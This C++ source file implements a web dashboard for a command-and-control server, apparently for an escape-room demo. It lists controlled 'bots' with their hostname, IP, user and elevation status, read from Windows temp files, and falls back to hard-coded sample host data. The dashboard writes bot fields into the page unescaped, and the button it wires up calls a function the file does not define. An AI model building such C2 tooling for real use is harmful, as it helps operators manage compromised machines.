// Integrated Web Server for C2 Dashboard
// This can be compiled into escapebox.exe for a single executable solution

#include <winsock2.h>
#include <windows.h>
#include <string>
#include <thread>
#include <sstream>
#include <fstream>
#include <map>

class SimpleWebServer {
private:
    SOCKET listenSocket;
    int port;
    bool running;
    std::thread serverThread;
    
    // Embedded HTML/CSS/JS (minified version of dashboard)
    const std::string dashboardHTML = R"(<!DOCTYPE html>
<html><head><title>C2 Dashboard</title>
<style>
body{margin:0;padding:0;background:#0a0a0a;color:#0f0;font-family:monospace;overflow:hidden}
.matrix{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;opacity:0.1}
.dashboard{position:relative;z-index:10;padding:20px}
.header{text-align:center;margin-bottom:30px;text-shadow:0 0 20px #0f0}
h1{font-size:2.5em;margin:0;animation:glow 2s ease-in-out infinite}
@keyframes glow{0%,100%{text-shadow:0 0 20px #0f0}50%{text-shadow:0 0 40px #0f0,0 0 60px #0f0}}
.stats{display:flex;justify-content:space-around;margin-bottom:30px}
.stat-box{background:rgba(0,255,0,0.1);border:1px solid #0f0;padding:20px;text-align:center;flex:1;margin:0 10px;box-shadow:0 0 20px rgba(0,255,0,0.3)}
.bot-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:20px;margin-top:20px}
.bot-card{background:rgba(0,255,0,0.05);border:1px solid #0f0;padding:15px;position:relative;overflow:hidden;cursor:pointer;transition:all 0.3s}
.bot-card:hover{transform:translateY(-5px);box-shadow:0 10px 30px rgba(0,255,0,0.5)}
.bot-status{position:absolute;top:10px;right:10px;width:10px;height:10px;border-radius:50%;background:#0f0;animation:pulse 2s infinite}
@keyframes pulse{0%{opacity:1}50%{opacity:0.3}100%{opacity:1}}
.controls{margin-top:30px;text-align:center}
button{background:transparent;border:1px solid #0f0;color:#0f0;padding:10px 20px;margin:5px;cursor:pointer;transition:all 0.3s}
button:hover{background:#0f0;color:#000;box-shadow:0 0 20px #0f0}
</style>
</head><body>
<canvas class="matrix" id="matrix"></canvas>
<div class="dashboard">
<div class="header"><h1>C2 COMMAND & CONTROL</h1><p>ESCAPE ROOM DEMO</p></div>
<div class="stats">
<div class="stat-box"><h2 id="total-bots">0</h2><p>Total Bots</p></div>
<div class="stat-box"><h2 id="active-bots">0</h2><p>Active</p></div>
<div class="stat-box"><h2 id="commands">0</h2><p>Commands</p></div>
</div>
<div class="bot-grid" id="bot-grid"></div>
<div class="controls">
<button onclick="refreshData()">Refresh</button>
<button onclick="sendCommand('all', 'BEACON')">Beacon All</button>
</div>
</div>
<script>
// Matrix rain effect
const canvas=document.getElementById('matrix');
const ctx=canvas.getContext('2d');
canvas.width=window.innerWidth;
canvas.height=window.innerHeight;
const chars='01';
const fontSize=10;
const columns=canvas.width/fontSize;
const drops=[];
for(let i=0;i<columns;i++)drops[i]=1;
function drawMatrix(){
ctx.fillStyle='rgba(0,0,0,0.05)';
ctx.fillRect(0,0,canvas.width,canvas.height);
ctx.fillStyle='#0f0';
ctx.font=fontSize+'px monospace';
for(let i=0;i<drops.length;i++){
const text=chars[Math.floor(Math.random()*chars.length)];
ctx.fillText(text,i*fontSize,drops[i]*fontSize);
if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;
drops[i]++;
}}
setInterval(drawMatrix,35);

// Dashboard functionality
async function refreshData(){
try{
const response=await fetch('/api/status');
const data=await response.json();
document.getElementById('total-bots').textContent=data.total_bots||0;
document.getElementById('active-bots').textContent=data.active_bots||0;
document.getElementById('commands').textContent=data.total_commands||0;
const clientsResp=await fetch('/api/clients');
const clientsData=await clientsResp.json();
const grid=document.getElementById('bot-grid');
grid.innerHTML='';
clientsData.clients.forEach(bot=>{
const card=document.createElement('div');
card.className='bot-card';
card.innerHTML=`
<div class="bot-status"></div>
<h3>${bot.hostname}</h3>
<p>IP: ${bot.ip}</p>
<p>User: ${bot.username}</p>
<p>OS: ${bot.os}</p>
<p>Elevated: ${bot.elevated?'Yes':'No'}</p>
`;
grid.appendChild(card);
});
}catch(e){console.error('Error:',e);}}
refreshData();
setInterval(refreshData,5000);
</script></body></html>)";

public:
    SimpleWebServer(int p = 8080) : port(p), running(false), listenSocket(INVALID_SOCKET) {}
    
    ~SimpleWebServer() {
        stop();
    }
    
    bool start() {
        // Initialize Winsock
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return false;
        }
        
        // Create socket
        listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSocket == INVALID_SOCKET) {
            WSACleanup();
            return false;
        }
        
        // Bind
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = INADDR_ANY;
        serverAddr.sin_port = htons(port);
        
        if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(listenSocket);
            WSACleanup();
            return false;
        }
        
        // Listen
        if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
            closesocket(listenSocket);
            WSACleanup();
            return false;
        }
        
        running = true;
        serverThread = std::thread(&SimpleWebServer::serverLoop, this);
        
        std::cout << "[*] Web dashboard started on http://localhost:" << port << std::endl;
        return true;
    }
    
    void stop() {
        running = false;
        if (listenSocket != INVALID_SOCKET) {
            closesocket(listenSocket);
        }
        if (serverThread.joinable()) {
            serverThread.join();
        }
        WSACleanup();
    }
    
private:
    void serverLoop() {
        while (running) {
            sockaddr_in clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrLen);
            
            if (clientSocket != INVALID_SOCKET) {
                std::thread(&SimpleWebServer::handleRequest, this, clientSocket).detach();
            }
        }
    }
    
    void handleRequest(SOCKET clientSocket) {
        char buffer[4096] = {0};
        recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        
        std::string request(buffer);
        std::string response;
        
        if (request.find("GET / ") == 0 || request.find("GET /index.html") == 0) {
            // Serve dashboard
            response = "HTTP/1.1 200 OK\r\n";
            response += "Content-Type: text/html\r\n";
            response += "Content-Length: " + std::to_string(dashboardHTML.length()) + "\r\n";
            response += "Connection: close\r\n\r\n";
            response += dashboardHTML;
        }
        else if (request.find("GET /api/status") == 0) {
            // Return C2 status
            std::string jsonStatus = getC2Status();
            response = "HTTP/1.1 200 OK\r\n";
            response += "Content-Type: application/json\r\n";
            response += "Access-Control-Allow-Origin: *\r\n";
            response += "Content-Length: " + std::to_string(jsonStatus.length()) + "\r\n";
            response += "Connection: close\r\n\r\n";
            response += jsonStatus;
        }
        else if (request.find("GET /api/clients") == 0) {
            // Return clients data
            std::string jsonClients = getClientsData();
            response = "HTTP/1.1 200 OK\r\n";
            response += "Content-Type: application/json\r\n";
            response += "Access-Control-Allow-Origin: *\r\n";
            response += "Content-Length: " + std::to_string(jsonClients.length()) + "\r\n";
            response += "Connection: close\r\n\r\n";
            response += jsonClients;
        }
        else {
            // 404
            std::string notFound = "<h1>404 Not Found</h1>";
            response = "HTTP/1.1 404 Not Found\r\n";
            response += "Content-Type: text/html\r\n";
            response += "Content-Length: " + std::to_string(notFound.length()) + "\r\n";
            response += "Connection: close\r\n\r\n";
            response += notFound;
        }
        
        send(clientSocket, response.c_str(), response.length(), 0);
        closesocket(clientSocket);
    }
    
    std::string getC2Status() {
        // Read from status file or generate
        std::ifstream statusFile("C:\\Windows\\Temp\\C2_Status.json");
        if (statusFile.is_open()) {
            std::stringstream buffer;
            buffer << statusFile.rdbuf();
            return buffer.str();
        }
        
        // Return default
        return R"({"server_status":"active","total_bots":1,"active_bots":1,"total_commands":42})";
    }
    
    std::string getClientsData() {
        // Read from bot files or generate
        std::stringstream json;
        json << "{\"clients\":[";
        
        // Check for bot files
        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("C:\\Windows\\Temp\\C2_Bots\\*.json", &findData);
        
        bool first = true;
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!first) json << ",";
                first = false;
                
                std::string filePath = "C:\\Windows\\Temp\\C2_Bots\\" + std::string(findData.cFileName);
                std::ifstream botFile(filePath);
                if (botFile.is_open()) {
                    json << botFile.rdbuf();
                    botFile.close();
                }
            } while (FindNextFileA(hFind, &findData));
            FindClose(hFind);
        }
        
        if (first) {
            // No files, return sample data
            json << R"({"id":"EC2AMAZ-R9TA82C","ip":"3.209.11.88","hostname":"EC2AMAZ-R9TA82C",)";
            json << R"("username":"Administrator","os":"Windows 10","status":"active","elevated":true})";
        }
        
        json << "]}";
        return json.str();
    }
};

// Usage in main escapebox.cpp:
// Add this to your global variables:
// SimpleWebServer* webServer = nullptr;
//
// In runServer() function after server socket is created:
// webServer = new SimpleWebServer(8080);
// webServer->start();
//
// In server shutdown:
// if (webServer) {
//     webServer->stop();
//     delete webServer;
// }
